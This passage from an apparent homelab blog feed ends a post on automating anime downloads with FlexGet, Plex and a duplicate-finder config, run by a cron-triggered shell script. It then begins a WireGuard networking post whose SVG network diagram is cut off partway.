class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mp3&quot;</span><span class="punctuation">:</span> <span class="number">1000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pcm&quot;</span><span class="punctuation">:</span> <span class="number">2500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;truehd&quot;</span><span class="punctuation">:</span> <span class="number">4500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;wmapro&quot;</span><span class="punctuation">:</span> <span class="number">200</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AUTO_DELETE&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;FIND_DUPLICATE_FILEPATHS_ONLY&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;FILENAME_SCORES&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;*.avi&quot;</span><span class="punctuation">:</span> <span class="number">-1000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*.ts&quot;</span><span class="punctuation">:</span> <span class="number">-1000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*.vob&quot;</span><span class="punctuation">:</span> <span class="number">-5000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*.mp4&quot;</span><span class="punctuation">:</span> <span class="number">-500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*.mkv&quot;</span><span class="punctuation">:</span> <span class="number">500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*1080p*BluRay*&quot;</span><span class="punctuation">:</span> <span class="number">15000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*720p*BluRay*&quot;</span><span class="punctuation">:</span> <span class="number">10000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*HDTV*&quot;</span><span class="punctuation">:</span> <span class="number">-1000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*PROPER*&quot;</span><span class="punctuation">:</span> <span class="number">1500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*REPACK*&quot;</span><span class="punctuation">:</span> <span class="number">1500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*Remux*&quot;</span><span class="punctuation">:</span> <span class="number">20000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*WEB*CasStudio*&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*WEB*KINGS*&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*WEB*NTB*&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*WEB*QOQ*&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*WEB*SiGMA*&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*WEB*TBS*&quot;</span><span class="punctuation">:</span> <span class="number">-1000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*WEB*TROLLHD*&quot;</span><span class="punctuation">:</span> <span class="number">2500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*WEB*VISUM*&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*dvd*&quot;</span><span class="punctuation">:</span> <span class="number">-1000</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PLEX_LIBRARIES&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;Bangumi&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PLEX_SERVER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://your.plex/&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PLEX_TOKEN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SCORE_FILESIZE&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SKIP_LIST&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;VIDEO_CODEC_SCORES&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Unknown&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;h264&quot;</span><span class="punctuation">:</span> <span class="number">8000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;h265&quot;</span><span class="punctuation">:</span> <span class="number">10000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hevc&quot;</span><span class="punctuation">:</span> <span class="number">10000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mpeg1video&quot;</span><span class="punctuation">:</span> <span class="number">250</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mpeg2video&quot;</span><span class="punctuation">:</span> <span class="number">250</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mpeg4&quot;</span><span class="punctuation">:</span> <span class="number">500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msmpeg4&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msmpeg4v2&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msmpeg4v3&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vc1&quot;</span><span class="punctuation">:</span> <span class="number">3000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vp9&quot;</span><span class="punctuation">:</span> <span class="number">1000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;wmv2&quot;</span><span class="punctuation">:</span> <span class="number">250</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;wmv3&quot;</span><span class="punctuation">:</span> <span class="number">250</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;VIDEO_RESOLUTION_SCORES&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;1080&quot;</span><span class="punctuation">:</span> <span class="number">10000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;480&quot;</span><span class="punctuation">:</span> <span class="number">3000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;4k&quot;</span><span class="punctuation">:</span> <span class="number">20000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;720&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Unknown&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sd&quot;</span><span class="punctuation">:</span> <span class="number">1000</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="统一启动-定时任务"><a href="#统一启动-定时任务" class="headerlink" title="统一启动 + 定时任务"></a>统一启动 + 定时任务</h2><p>这里需要再 <code>flexget</code> 执行后，需要跑一些脚本，不用 <code>flexget</code> 的 <code>schedule</code>，用 <code>crontab</code> 触发</p><p><strong>run.sh</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ! /bin/bash</span><br><span class="line">find /mnt/WEB-DL/ -type d -empty  # 自动清空目录为空的文件夹</span><br><span class="line">source /flexget/bin/activate</span><br><span class="line">cd /config/flexget  # 配置在这里</span><br><span class="line">flexget --cron execute</span><br><span class="line">python flexget-auto.py &gt; flexget-auto.log</span><br><span class="line">/plex_dupefinder/plex_dupefinder.sh &gt; plex_dupefinder.log</span><br></pre></td></tr></table></figure><p>再加入 <code>crontab</code> 就搞定啦~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/10 * * * * &quot;/flexget/run.sh&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;啊B最近番剧越来越不能看了，加上鼓捣影音库已经上了&lt;code&gt;Plex Pass&lt;/code&gt;，是时候鼓捣自动下番了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kur4ge.oss-accelerate.aliyuncs.com/2023/07/flexget-plex-and-bangumi/plex.png&quot; alt=&quot;Plex Bangumi&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="尝尝鲜" scheme="https://blog.kur4ge.com/categories/%E5%B0%9D%E5%B0%9D%E9%B2%9C/"/>
    
    
    <category term="flexget" scheme="https://blog.kur4ge.com/tags/flexget/"/>
    
    <category term="plex" scheme="https://blog.kur4ge.com/tags/plex/"/>
    
    <category term="bangumi" scheme="https://blog.kur4ge.com/tags/bangumi/"/>
    
    <category term="homelab" scheme="https://blog.kur4ge.com/tags/homelab/"/>
    
  </entry>
  
  <entry>
    <title>Wireguard 组网</title>
    <link href="https://blog.kur4ge.com/2023/01/wireguard-network-link/"/>
    <id>https://blog.kur4ge.com/2023/01/wireguard-network-link/</id>
    <published>2023-01-27T06:18:47.000Z</published>
    <updated>2023-01-27T06:18:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>随着上一篇 <a href="/2022/02/wireguard-tutorial/">WireGuard 简易上手</a>，已经对 WireGuard 有了一定了解。<br>接着我们可以通过 WireGuard 进行进阶的组网操作。</p><span id="more"></span><p>可以查看一下下面的网络图，简单来说我们可以通过WireGuard 使 NodeA，NodeB 互通，并且也能访问到 UbuntuC 中所在网段（单向）</p><div style="margin: 0 0 20px;">                    <div style=" margin: 0 auto;">                    <?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><!-- Generated by graphviz version 2.40.1 (20161225.0304) --><!-- Title: %0 Pages: 1 --><svg  viewBox="0.00 0.00 1020.81 194.85" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="graph0" class="graph" transform="scale(1 1) rotate(0) translate(4 190.8515)"><title></title><polygon fill="#ffffff" stroke="transparent" points="-4,4 -4,-190.8515 1016.8148,-190.8515 1016.8148,4 -4,4"/><!-- Master --><g id="node1" class="node"><title>Master</title><polygon fill="none" stroke="#000000" points="461.4086,-67.0014 350.4063,-67.0014 350.4063,-8.1986 461.4086,-8.1986 461.4086,-67.0014"/><text text-anchor="middle" x="405.9074" y="-50.2" font-family="Times,serif" font-size="14.00" fill="#000000">Master</text><text text-anchor="middle" x="405.9074" y="-33.4" font-family="Times,serif" font-size="14.00" fill="#000000">192.168.234.128</text><text text-anchor="middle" x="405.9074" y="-16.6" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.0.1</text></g><!-- OpenwrtA --><g id="node2" class="node"><title>OpenwrtA</title><polygon fill="none" stroke="#000000" points="332.4086,-75.3003 229.4062,-75.3003 229.4062,.1003 332.4086,.1003 332.4086,-75.3003"/><text text-anchor="middle" x="280.9074" y="-58.6" font-family="Times,serif" font-size="14.00" fill="#000000">Openwrt A</text><text text-anchor="middle" x="280.9074" y="-41.8" font-family="Times,serif" font-size="14.00" fill="#000000">192.168.123.11</text><text text-anchor="middle" x="280.9074" y="-25" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.0.2</text><text text-anchor="middle" x="280.9074" y="-8.2" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.1.1</text></g><!-- OpenwrtB --><g id="node3" class="node"><title>OpenwrtB</title><polygon fill="none" stroke="#000000" points="582.4086,-75.3003 479.4062,-75.3003 479.4062,.1003 582.4086,.1003 582.4086,-75.3003"/><text text-anchor="middle" x="530.9074" y="-58.6" font-family="Times,serif" font-size="14.00" fill="#000000">Openwrt B</text><text text-anchor="middle" x="530.9074" y="-41.8" font-family="Times,serif" font-size="14.00" fill="#000000">192.168.123.12</text><text text-anchor="middle" x="530.9074" y="-25" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.0.3</text><text text-anchor="middle" x="530.9074" y="-8.2" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.1.1</text></g><!-- UbuntuC --><g id="node4" class="node"><title>UbuntuC</title><polygon fill="none" stroke="#000000" points="732.9087,-67.0014 636.9061,-67.0014 636.9061,-8.1986 732.9087,-8.1986 732.9087,-67.0014"/><text text-anchor="middle" x="684.9074" y="-50.2" font-family="Times,serif" font-size="14.00" fill="#000000">Ubuntu C</text><text text-anchor="middle" x="684.9074" y="-33.4" font-family="Times,serif" font-size="14.00" fill="#000000">192.168.31.10</text><text text-anchor="middle" x="684.9074" y="-16.6" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.0.4</text></g><!-- NodeA --><g id="node5" class="node"><title>NodeA</title><polygon fill="none" stroke="#000000" points="118.9089,-58.2019 36.9059,-58.2019 36.9059,-16.9981 118.9089,-16.9981 118.9089,-58.2019"/><text text-anchor="middle" x="77.9074" y="-41.8" font-family="Times,serif" font-size="14.00" fill="#000000">Node A</text><text text-anchor="middle" x="77.9074" y="-25" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.1.10</text></g><!-- NodeB --><g id="node6" class="node"><title>NodeB</title><polygon fill="none" stroke="#000000" points="975.9089,-58.2019 893.9059,-58.2019 893.9059,-16.9981 975.9089,-16.9981 975.9089,-58.2019"/><text text-anchor="middle" x="934.9074" y="-41.8" font-family="Times,serif" font-size="14.00" fill="#000000">Node B</text><text text-anchor="middle" x="934.9074" y="-25" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.2.10</text></g><!-- VMnet0 --><g id="node7" class="node"><title>VMnet0</title><polygon fill="none" stroke="#0000ff" points="317.0626,-128.1545 325.1104,-128.3152 333.0749,-128.5557 340.9237,-128.8753 348.625,-129.2731 356.1478,-129.7482 363.4625,-130.2991 370.5407,-130.9243 377.3554,-131.6222 383.8813,-132.3908 390.0949,-133.228 395.9746,-134.1315 401.5008,-135.0989 406.6561,-136.1275 411.425,-137.2145 415.7946,-138.3568 419.754,-139.5515 423.2948,-140.7951 426.4106,-142.0843 429.0976,-143.4155 431.354,-144.7852 433.1802,-146.1895 434.5787,-147.6246 435.5542,-149.0866 436.113,-150.5714 436.2634,-152.075 436.0151,-153.5933 435.3797,-155.122 434.3698,-156.6571 432.9995,-158.1943 431.2837,-159.7294 429.2383,-161.2582 426.88,-162.7765 424.2259,-164.2801 421.2936,-165.7649 418.1009,-167.2269 414.6655,-168.662 411.0055,-170.0663 407.1381,-171.4359 403.0808,-172.7672 398.8502,-174.0564 394.4626,-175.3 389.9333,-176.4946 385.2773,-177.637 380.5083,-178.7239 375.6396,-179.7525 370.6832,-180.7199 365.6504,-181.6235 360.5515,-182.4607 355.396,-183.2293 350.1922,-183.9272 344.9479,-184.5524 339.6699,-185.1033 334.3644,-185.5783 329.0366,-185.9762 323.6916,-186.2958 318.3336,-186.5362 312.9666,-186.6969 307.5944,-186.7774 302.2204,-186.7774 296.8482,-186.6969 291.4813,-186.5362 286.1233,-186.2958 280.7782,-185.9762 275.4505,-185.5783 270.1449,-185.1033 264.8669,-184.5524 259.6226,-183.9272 254.4189,-183.2293 249.2633,-182.4607 244.1644,-181.6235 239.1317,-180.7199 234.1753,-179.7525 229.3065,-178.7239 224.5376,-177.637 219.8815,-176.4946 215.3523,-175.3 210.9646,-174.0564 206.734,-172.7672 202.6767,-171.4359 198.8094,-170.0663 195.1493,-168.662 191.714,-167.2269 188.5212,-165.7649 185.5889,-164.2801 182.9349,-162.7765 180.5765,-161.2582 178.5312,-159.7294 176.8154,-158.1943 175.445,-156.6571 174.4351,-155.122 173.7997,-153.5933 173.5515,-152.075 173.7018,-150.5714 174.2606,-149.0866 175.2361,-147.6246 176.6347,-146.1895 178.4609,-144.7852 180.7173,-143.4155 183.4042,-142.0843 186.5201,-140.7951 190.0608,-139.5515 194.0202,-138.3568 198.3898,-137.2145 203.1588,-136.1275 208.314,-135.0989 213.8402,-134.1315 219.7199,-133.228 225.9335,-132.3908 232.4595,-131.6222 239.2741,-130.9243 246.3523,-130.2991 253.667,-129.7482 261.1899,-129.2731 268.8911,-128.8753 276.7399,-128.5557 284.7044,-128.3152 292.7522,-128.1545 300.8501,-128.0741 308.9647,-128.0741 317.0626,-128.1545"/><text text-anchor="middle" x="304.9074" y="-161.6257" font-family="Times,serif" font-size="14.00" fill="#0000ff">Vmware NAT(INTERNET)</text><text text-anchor="middle" x="304.9074" y="-144.8257" font-family="Times,serif" font-size="14.00" fill="#0000ff">192.168.234.0/24</text></g><!-- VMnet0&#45;&gt;Master --><g id="edge1" class="edge"><title>VMnet0&#45;&gt;Master</title><path fill="none" stroke="#0000ff" d="M329.3567,-128.4193C342.9249,-112.3221 359.948,-92.1259 374.494,-74.8687"/><polygon fill="#0000ff" stroke="#0000ff" points="377.2129,-77.0737 380.9816,-67.1718 371.8606,-72.5622 377.2129,-77.0737"/></g><!-- VMnet0&#45;&gt;OpenwrtA --><g id="edge2" class="edge"><title>VMnet0&#45;&gt;OpenwrtA</title><path fill="none" stroke="#0000ff" d="M298.9748,-127.8059C296.4281,-115.0907 293.3866,-99.9052 290.5319,-85.6525"/><polygon fill="#0000ff" stroke="#0000ff" points="293.8918,-84.6058 288.496,-75.4879 287.0282,-85.9806 293.8918,-84.6058"/></g><!-- VMnet0&#45;&gt;OpenwrtB --><g id="edge3" class="edge"><title>VMnet0&#45;&gt;OpenwrtB</title><path fill="none" stroke="#0000ff" d="M362.8378,-130.1377C394.7811,-114.6978 434.9398,-94.6381 469.9074,-75.2 470.0977,-75.0942 470.2882,-74.9881 470.479,-74.8817"/><polygon fill="#0000ff" stroke="#0000ff" points="472.227,-77.9141 479.1819,-69.9216 468.7608,-71.8325 472.227,-77.9141"/></g><!-- VMnet1 --><g id="node8" class="node"><title>VMnet1</title><polygon fill="none" stroke="#000000" points="85.1081,-128.1545 89.8756,-128.3152 94.5938,-128.5557 99.2434,-128.8753 103.8056,-129.2731 108.2621,-129.7482 112.5953,-130.2991 116.7884,-130.9243 120.8254,-131.6222 124.6914,-132.3908 128.3723,-133.228 131.8554,-134.1315 135.1291,-135.0989 138.1831,-136.1275 141.0082,-137.2145 143.5967,-138.3568 145.9423,-139.5515 148.0398,-140.7951 149.8856,-142.0843 151.4774,-143.4155 152.814,-144.7852 153.8959,-146.1895 154.7244,-147.6246 155.3023,-149.0866 155.6333,-150.5714 155.7224,-152.075 155.5753,-153.5933 155.1989,-155.122 154.6006,-156.6571 153.7889,-158.1943 152.7724,-159.7294 151.5607,-161.2582 150.1637,-162.7765 148.5914,-164.2801 146.8543,-165.7649 144.9629,-167.2269 142.9279,-168.662 140.7596,-170.0663 138.4687,-171.4359 136.0651,-172.7672 133.5589,-174.0564 130.9597,-175.3 128.2766,-176.4946 125.5183,-177.637 122.6932,-178.7239 119.809,-179.7525 116.8728,-180.7199 113.8914,-181.6235 110.8709,-182.4607 107.8167,-183.2293 104.734,-183.9272 101.6273,-184.5524 98.5007,-185.1033 95.3576,-185.5783 92.2015,-185.9762 89.0351,-186.2958 85.861,-186.5362 82.6817,-186.6969 79.4992,-186.7774 76.3157,-186.7774 73.1332,-186.6969 69.9538,-186.5362 66.7797,-186.2958 63.6133,-185.9762 60.4572,-185.5783 57.3142,-185.1033 54.1875,-184.5524 51.0808,-183.9272 47.9981,-183.2293 44.944,-182.4607 41.9234,-181.6235 38.942,-180.7199 36.0059,-179.7525 33.1216,-178.7239 30.2965,-177.637 27.5383,-176.4946 24.8552,-175.3 22.2559,-174.0564 19.7497,-172.7672 17.3462,-171.4359 15.0552,-170.0663 12.887,-168.662 10.8519,-167.2269 8.9605,-165.7649 7.2234,-164.2801 5.6512,-162.7765 4.2541,-161.2582 3.0424,-159.7294 2.026,-158.1943 1.2142,-156.6571 .6159,-155.122 .2395,-153.5933 .0925,-152.075 .1815,-150.5714 .5126,-149.0866 1.0904,-147.6246 1.9189,-146.1895 3.0008,-144.7852 4.3375,-143.4155 5.9292,-142.0843 7.775,-140.7951 9.8726,-139.5515 12.2181,-138.3568 14.8066,-137.2145 17.6318,-136.1275 20.6857,-135.0989 23.9594,-134.1315 27.4425,-133.228 31.1235,-132.3908 34.9894,-131.6222 39.0264,-130.9243 43.2195,-130.2991 47.5527,-129.7482 52.0092,-129.2731 56.5714,-128.8753 61.221,-128.5557 65.9392,-128.3152 70.7067,-128.1545 75.5039,-128.0741 80.311,-128.0741 85.1081,-128.1545"/><text text-anchor="middle" x="77.9074" y="-161.6257" font-family="Times,serif" font-size="14.00" fill="#000000">Vmware NAT1</text><text text-anchor="middle" x="77.9074" y="-144.8257" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.1.0/24</text></g><!-- VMnet1&#45;&gt;OpenwrtA --><g id="edge4" class="edge"><title>VMnet1&#45;&gt;OpenwrtA</title><path fill="none" stroke="#000000" d="M121.456,-131.7201C150.3144,-114.6857 188.572,-92.1033 220.379,-73.3284"/><polygon fill="#000000" stroke="#000000" points="222.3334,-76.239 229.1659,-68.1417 218.7751,-70.2109 222.3334,-76.239"/></g><!-- VMnet1&#45;&gt;NodeA --><g id="edge5" class="edge"><title>VMnet1&#45;&gt;NodeA</title><path fill="none" stroke="#000000" d="M77.9074,-127.8059C77.9074,-109.7304 77.9074,-86.6629 77.9074,-68.3796"/><polygon fill="#000000" stroke="#000000" points="81.4075,-68.2414 77.9074,-58.2414 74.4075,-68.2414 81.4075,-68.2414"/></g><!-- VMnet2 --><g id="node9" class="node"><title>VMnet2</title><polygon fill="none" stroke="#000000" points="942.1081,-128.1545 946.8756,-128.3152 951.5938,-128.5557 956.2434,-128.8753 960.8056,-129.2731 965.2621,-129.7482 969.5953,-130.2991 973.7884,-130.9243 977.8254,-131.6222 981.6914,-132.3908 985.3723,-133.228 988.8554,-134.1315 992.1291,-135.0989 995.1831,-136.1275 998.0082,-137.2145 1000.5967,-138.3568 1002.9423,-139.5515 1005.0398,-140.7951 1006.8856,-142.0843 1008.4774,-143.4155 1009.814,-144.7852 1010.8959,-146.1895 1011.7244,-147.6246 1012.3023,-149.0866 1012.6333,-150.5714 1012.7224,-152.075 1012.5753,-153.5933 1012.1989,-155.122 1011.6006,-156.6571 1010.7889,-158.1943 1009.7724,-159.7294 1008.5607,-161.2582 1007.1637,-162.7765 1005.5914,-164.2801 1003.8543,-165.7649 1001.9629,-167.2269 999.9279,-168.662 997.7596,-170.0663 995.4687,-171.4359 993.0651,-172.7672 990.5589,-174.0564 987.9597,-175.3 985.2766,-176.4946 982.5183,-177.637 979.6932,-178.7239 976.809,-179.7525 973.8728,-180.7199 970.8914,-181.6235 967.8709,-182.4607 964.8167,-183.2293 961.734,-183.9272 958.6273,-184.5524 955.5007,-185.1033 952.3576,-185.5783 949.2015,-185.9762 946.0351,-186.2958 942.861,-186.5362 939.6817,-186.6969 936.4992,-186.7774 933.3157,-186.7774 930.1332,-186.6969 926.9538,-186.5362 923.7797,-186.2958 920.6133,-185.9762 917.4572,-185.5783 914.3142,-185.1033 911.1875,-184.5524 908.0808,-183.9272 904.9981,-183.2293 901.944,-182.4607 898.9234,-181.6235 895.942,-180.7199 893.0059,-179.7525 890.1216,-178.7239 887.2965,-177.637 884.5383,-176.4946 881.8552,-175.3 879.2559,-174.0564 876.7497,-172.7672 874.3462,-171.4359 872.0552,-170.0663 869.887,-168.662 867.8519,-167.2269 865.9605,-165.7649 864.2234,-164.2801 862.6512,-162.7765 861.2541,-161.2582 860.0424,-159.7294 859.026,-158.1943 858.2142,-156.6571 857.6159,-155.122 857.2395,-153.5933 857.0925,-152.075 857.1815,-150.5714 857.5126,-149.0866 858.0904,-147.6246 858.9189,-146.1895 860.0008,-144.7852 861.3375,-143.4155 862.9292,-142.0843 864.775,-140.7951 866.8726,-139.5515 869.2181,-138.3568 871.8066,-137.2145 874.6318,-136.1275 877.6857,-135.0989 880.9594,-134.1315 884.4425,-133.228 888.1235,-132.3908 891.9894,-131.6222 896.0264,-130.9243 900.2195,-130.2991 904.5527,-129.7482 909.0092,-129.2731 913.5714,-128.8753 918.221,-128.5557 922.9392,-128.3152 927.7067,-128.1545 932.5039,-128.0741 937.311,-128.0741 942.1081,-128.1545"/><text text-anchor="middle" x="934.9074" y="-161.6257" font-family="Times,serif" font-size="14.00" fill="#000000">Vmware NAT2</text><text text-anchor="middle" x="934.9074" y="-144.8257" font-family="Times,serif" font-size="14.00" fill="#000000">100.64.2.0/24</text></g><!-- VMnet2&#45;&gt;OpenwrtB --><g id="edge6" class="edge"><title>VMnet2&#45;&gt;OpenwrtB</title><path fill="none" stroke="#000000" d="M874.2843,-136.1398C865.4755,-133.275 856.4866,-130.4749 847.9074,-128 751.2927,-100.1294 723.891,-105.1723 627.9074,-75.2 616.1403,-71.5255 603.7526,-67.1377 591.9117,-62.678"/><polygon fill="#000000" stroke="#000000" points="593.1455,-59.4026 582.5551,-59.0982 590.6442,-65.9405 593.1455,-59.4026"/></g><!-- VMnet2&#45;&gt;NodeB --><g id="edge7" class="edge"><title>VMnet2&#45;&gt;NodeB</title><path fill="none" stroke="#000000" d="M934.9074,-127.8059C934.9074,-109.7304 934.9074,-86.6629 934.9074,-68.3796"/><polygon fill="#000000" stroke="#000000" points="938.4075,-68.2414 934.9074,-58.2414 931.4075,-68.2414 938.4075,-68.2414"/></g><!-- VMnet3 --><g id="node10" class="node"><title>VMnet3</title><polygon fill="none" stroke="#ffa500" points="736.3712,-128.1545 743.2991,-128.3152 750.1554,-128.5557 756.912,-128.8753 763.5416,-129.2731 770.0176,-129.7482 776.3144,-130.2991 782.4077,-130.9243 788.2741,-131.6222 793.8919,-132.3908 799.2409,-133.228 804.3024,-134.1315 809.0596,-135.0989 813.4975,-136.1275 817.6028,-137.2145 821.3644,-138.3568 824.7728,-139.5515 827.8209,-140.7951 830.5031,-142.0843 832.8162,-143.4155 834.7586,-144.7852 836.3307,-146.1895 837.5346,-147.6246 838.3744,-149.0866 838.8554,-150.5714 838.9848,-152.075 838.7712,-153.5933 838.2241,-155.122 837.3548,-156.6571 836.1751,-158.1943 834.6981,-159.7294 832.9373,-161.2582 830.9072,-162.7765 828.6224,-164.2801 826.0982,-165.7649 823.3497,-167.2269 820.3924,-168.662 817.2416,-170.0663 813.9125,-171.4359 810.4197,-172.7672 806.7778,-174.0564 803.0007,-175.3 799.1018,-176.4946 795.0936,-177.637 790.9883,-178.7239 786.797,-179.7525 782.5303,-180.7199 778.1979,-181.6235 773.8085,-182.4607 769.3703,-183.2293 764.8907,-183.9272 760.3762,-184.5524 755.8326,-185.1033 751.2653,-185.5783 746.679,-185.9762 742.0777,-186.2958 737.4653,-186.5362 732.8452,-186.6969 728.2205,-186.7774 723.5943,-186.7774 718.9697,-186.6969 714.3496,-186.5362 709.7371,-186.2958 705.1359,-185.9762 700.5495,-185.5783 695.9822,-185.1033 691.4387,-184.5524 686.9241,-183.9272 682.4445,-183.2293 678.0063,-182.4607 673.617,-181.6235 669.2845,-180.7199 665.0178,-179.7525 660.8266,-178.7239 656.7212,-177.637 652.7131,-176.4946 648.8141,-175.3 645.037,-174.0564 641.3951,-172.7672 637.9024,-171.4359 634.5732,-170.0663 631.4224,-168.662 628.4651,-167.2269 625.7167,-165.7649 623.1924,-164.2801 620.9076,-162.7765 618.8775,-161.2582 617.1167,-159.7294 615.6397,-158.1943 614.46,-156.6571 613.5907,-155.122 613.0437,-153.5933 612.83,-152.075 612.9594,-150.5714 613.4405,-149.0866 614.2802,-147.6246 615.4842,-146.1895 617.0562,-144.7852 618.9986,-143.4155 621.3117,-142.0843 623.994,-140.7951 627.042,-139.5515 630.4505,-138.3568 634.212,-137.2145 638.3174,-136.1275 642.7552,-135.0989 647.5124,-134.1315 652.574,-133.228 657.923,-132.3908 663.5408,-131.6222 669.4072,-130.9243 675.5004,-130.2991 681.7972,-129.7482 688.2733,-129.2731 694.9029,-128.8753 701.6595,-128.5557 708.5157,-128.3152 715.4436,-128.1545 722.4147,-128.0741 729.4002,-128.0741 736.3712,-128.1545"/><text text-anchor="middle" x="725.9074" y="-161.6257" font-family="Times,serif" font-size="14.00" fill="#ffa500">Vmware NAT3(DHCP)</text><text text-anchor="middle" x="725.9074" y="-144.8257" font-family="Times,serif" font-size="14.00" fill="#ffa500">192.168.31.0/24</text></g><!-- VMnet3&#45;&gt;UbuntuC --><g id="edge8" class="edge"><title>VMnet3&#45;&gt;UbuntuC</title><path fill="none" stroke="#ffa500" d="M715.8777,-128.1131C710.5666,-112.5909 703.9738,-93.3229 698.2378,-76.5591"/><polygon fill="#ffa500" stroke="#ffa500" 